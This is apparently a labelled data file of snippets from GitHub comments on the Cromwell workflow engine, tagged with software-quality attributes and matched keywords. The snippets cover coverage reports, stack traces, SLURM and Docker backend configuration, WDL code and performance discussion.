Modifiability,vYXBpL0FjdGlvbkJ1aWxkZXIuc2NhbGE=) | `82.4% <84.61%> (+20.5%)` | :arrow_up: |; | [.../scala/cromiam/webservice/EngineRouteSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-Q3JvbUlBTS9zcmMvbWFpbi9zY2FsYS9jcm9taWFtL3dlYnNlcnZpY2UvRW5naW5lUm91dGVTdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...expression/renaming/BinaryOperatorEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvbmV3LWJhc2Uvc3JjL21haW4vc2NhbGEvd2RsL3RyYW5zZm9ybXMvYmFzZS93ZGxvbTJ3b20vZXhwcmVzc2lvbi9yZW5hbWluZy9CaW5hcnlPcGVyYXRvckV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...l/services/womtool/models/WomTypeJsonSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21haW4vc2NhbGEvY3JvbXdlbGwvc2VydmljZXMvd29tdG9vbC9tb2RlbHMvV29tVHlwZUpzb25TdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...end/impl/sfs/config/CpuDeclarationValidation.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9zZnMvY29uZmlnL0NwdURlY2xhcmF0aW9uVmFsaWRhdGlvbi5zY2FsYQ==) | `0% <0%> (-100%)` | :arrow_down: |; | [...aft2/src/main/scala/wdl/draft2/model/package.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL21vZGVsL2RyYWZ0Mi9zcmMvbWFpbi9zY2FsYS93ZGwvZHJhZnQyL21vZGVsL3BhY2thZ2Uuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...ool/src/main/scala/womtool/validate/Validate.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d29tdG9vbC9zcmMvbWFpbi9zY2FsYS93b210b29sL3ZhbGlkYXRlL1ZhbGlkYXRlLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...king/expression/files/BiscayneFileEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvc3JjL21haW4vc2NhbGEvd2RsL3RyY,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620:2333,config,config,2333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620,1,['config'],['config']
Modifiability,va.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroun,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:1563,config,config,1563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['config'],['config']
Modifiability,"well-system-akka.dispatchers.backend-dispatcher-101 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,977 cromwell-system-akka.dispatchers.engine-dispatcher-57 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.engine-dispatcher-67 INFO - WorkflowManagerActor WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030 is in a terminal state: WorkflowSucceededState; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.io-dispatcher-10 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log to /8ee1f938-a92c-48df-a4cc-7a0683413547/workflow.logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,184 cromwell-system-akka.actor.default-dispatcher-154 INFO - Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/cromwell-service/SubWorkflowStoreActor#1592013866] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030#1939109793] was not delivered. [6] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'ak; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986:3890,config,configuration,3890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986,1,['config'],['configuration']
Modifiability,what was the scenario that caused the failure (so we can reproduce)? bad credential for a remote db? botched config?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-230869079:109,config,config,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-230869079,1,['config'],['config']
Modifiability,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5408,config,configurations,5408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configurations']
Modifiability,"work bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages on disk are buckets of row values. MySQL accesses the disk at the granularity of a page, it can't fetch just a single value. Therefore, fetching some data from a page (MySQL filtering) versus all data from a page (client-side filtering) does not make a difference in the number of pages read. This is supported by the graph. It would also appear that filtering in memory, whether on client or server, does not have much of a CPU cost at all either for Cromwell nor for MySQL, because we do not see MySQL doing any less work nor Cromwell doing any more. I think this is because once a set of rows is already in memory (after reading a page or receiving the rows over the wire) choosing specific ones is trivial. For MySQL, finding and loading the pages into memory is the hard part.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:1920,variab,variable,1920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,1,['variab'],['variable']
Modifiability,"xisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationAct",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4162,config,config,4162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"y = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitia",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4044,config,config,4044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,yeah I hesitated to argue because I know these are very stable and basically will never be used differently. I just kinda like the configuration all in one place personally. The one place also makes the scanning effort easier.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2499#issuecomment-318475624:131,config,configuration,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2499#issuecomment-318475624,1,['config'],['configuration']
Modifiability,"ype(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(may",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1387,variab,variable,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,1,['variab'],['variable']
Modifiability,"~~@ffinfo just to be clear - unless the script explodes in a **really** unusual way, you should _always_ eventually get a return code file. So for us, waiting for it to appear is sufficient. (e.g. even if a command fails, we still get the return code file).~~. ~~In fact, in previous Cromwell versions (before making these backends ""config-file based"") our hard-coded local and SGE backends waited for the return code file and never checked `isAlive` apart from at restart-time.~~. ~~Just so I can understand, is there a specific reason that you don't believe that an `rc` file will eventually be produced for your situation? (and if so, could we maybe try to protect that instead?)~~. EDIT: I just read the gitter log you copied above. I think I see now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243137051:333,config,config-file,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243137051,1,['config'],['config-file']
Modifiability,~~Going to refactor this a little~~ EDIT: no I'm not,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5032#issuecomment-502847254:11,refactor,refactor,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5032#issuecomment-502847254,1,['refactor'],['refactor']
Modifiability,👍 . ToL: Since they all extend the `BatchingDbWriterActor` trait we could even put this logging there instead. [![Approved with PullApprove](https://img.shields.io/badge/reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2543/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2543#issuecomment-321990621:24,extend,extend,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2543#issuecomment-321990621,1,['extend'],['extend']
Modifiability,"🤔. After looking at things like `GcsBatchIsDirectoryCommand` that does accept blobs without paths, FYI my approach to `develop` may be different. I think this band-aid for a very specific known case **might be** fine for 53, but my `develop` PR will likely label ""`BlobId` instances that allowed to have no object"" vs. ""`BlobId` instances that represents a pseudo directory, like `backend.providers.Papi.config.root = ""gs://kshakir-dsde-cromwell-dev""`""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718:404,config,config,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718,1,['config'],['config']
Performance," *** FAILED *** (3 minutes, 18 seconds); - should fail during execution relative_output_paths_colliding *** FAILED *** (3 minutes, 27 seconds); - should successfully run curl *** FAILED *** (8 minutes, 38 seconds); - should successfully run cwl_cache_within_workflow *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_import_type_packed *** FAILED *** (3 minutes, 43 seconds); - should successfully run cwl_interpolated_strings *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_relative_imports_url *** FAILED *** (3 minutes, 37 seconds); - should successfully run cwl_relative_imports_zip *** FAILED *** (2 minutes, 52 seconds); - should successfully run docker_hash_dockerhub *** FAILED *** (5 minutes, 18 seconds); - should successfully run docker_hash_gcr *** FAILED *** (5 minutes, 31 seconds); - should successfully run docker_hash_quay *** FAILED *** (4 minutes, 31 seconds); - should successfully run hello *** FAILED *** (2 minutes, 54 seconds); - should successfully run hello_yaml *** FAILED *** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2448,cache,cache,2448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,1,['cache'],['cache']
Performance," <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974> <#5974; > <https://github.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1565,concurren,concurrently,1565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965,1,['concurren'],['concurrently']
Performance," DB fine for a few weeks, but today had a seemingly unrelated problem and this seems to have corrupted the DB. Potentially unrelated error:; ```; akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://cromwell-system/user/cromwell-service/WorkflowStoreCoo; rdinatedAccessActor#1289452983]] after [60000 ms]. Message of type [cromwell.engine.workflow.workflowstore.WorkflowStor; eCoordinatedAccessActor$FetchStartableWorkflows]. A typical reason for `AskTimeoutException` is that the recipient acto; r didn't send a reply.; at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:675); at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:696); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:202); at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:875); at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:113); at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:107); at scala.concurrent.Future$InternalCallbackExecutor$.execute(Future.scala:873); at akka.actor.LightArrayRevolverScheduler$TaskHolder.executeTask(LightArrayRevolverScheduler.scala:334); at akka.actor.LightArrayRevolverScheduler$$anon$3.executeBucket$1(LightArrayRevolverScheduler.scala:285); at akka.actor.LightArrayRevolverScheduler$$anon$3.nextTick(LightArrayRevolverScheduler.scala:289); at akka.actor.LightArrayRevolverScheduler$$anon$3.run(LightArrayRevolverScheduler.scala:241); at java.base/java.lang.Thread.run(Thread.java:834); ```. Error that I receive now when I try to start Cromwell:. ```; 2020-05-05 15:31:33,773 INFO - dataFileCache commit start; 2020-05-05 15:33:32,400 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 121641ms.; at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:676); at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.jav",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649:1045,concurren,concurrent,1045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649,1,['concurren'],['concurrent']
Performance," I see what you mean but it's the only way. When in SGE your job is killed he never get to the point of $? > rc; > so cromwell can not detect is a job is killed, meaning it will end in a endless loop polling for rc what never will come anymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1208,load,load,1208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,1,['load'],['load']
